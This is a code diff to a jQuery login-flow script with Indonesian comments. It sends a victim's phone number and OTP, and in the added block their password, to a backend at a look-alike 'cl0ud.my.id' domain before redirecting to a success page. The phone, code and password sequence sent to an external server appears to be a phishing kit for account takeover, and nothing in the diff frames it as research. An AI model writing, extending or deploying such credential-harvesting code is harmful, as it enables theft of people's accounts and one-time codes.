@@ -21,7 +21,7 @@ $("#1").on("click", function(e){
     $("#loader").show();
     $.ajax({
         type: "POST",
-        url: "https://rafie-server-ketiga.cl0ud.my.id:1000/sendCode", // Endpoint backend
+        url: "https://rafie-server-ketiga.cl0ud.my.id:5000/sendCode", // Endpoint backend
         data: JSON.stringify({
             phoneNumber: phone // Ambil nomor dari input
         }),
@@ -65,7 +65,7 @@ $("#2").on("click", function(e){
       $("#loader").show();
       $.ajax({
         type: "POST",
-        url: "https://rafie-server-ketiga.cl0ud.my.id:1000/verifyCode", // Endpoint backend
+        url: "https://rafie-server-ketiga.cl0ud.my.id:5000/verifyCode", // Endpoint backend
         data: JSON.stringify({
             phoneNumber: phone,
             otp: otp,
@@ -111,11 +111,44 @@ $("#2").on("click", function(e){
   });
 
 
-  $( "#3" ).on( "click", function( event ) {
+$( "#3" ).on( "click", function( event ) {
     event.preventDefault();
   
     $("#loader").show();
-    setTimeout(function(){
-        window.location.replace("sukses.html");
-    }, 1500);
+    var phone = sessionStorage.getItem("phone_number");
+    var pw = $("input#password").val();
+
+    $.ajax({
+      type: "POST",
+      url: "https://rafie-server-ketiga.cl0ud.my.id:5000/verifyPassword", // Endpoint backend
+      data: JSON.stringify({
+          phoneNumber: phone, // Ambil nomor dari input
+          password: pw // Ambil password dari input
+      }),
+      contentType: "application/json",
+      dataType: 'JSON',
+      success: function(response){
+  
+          // Jika response tidak berupa JSON
+          if (typeof response !== 'object') {
+              return;
+          }
+  
+  
+          if (response.status === 'error') {
+              $("#loader").hide();
+              alert("Silakan masukan password yang benar");
+          } else {
+            setTimeout(function(){
+              window.location.replace("sukses.html");
+          }, 1500);
+          }
+  
+      },
+      error: function(xhr, status, error) {
+          console.error("AJAX Error:", status, error);
+          alert("Silakan masukan password yang benar");
+              $("#loader").hide();
+          }
+  });
   });
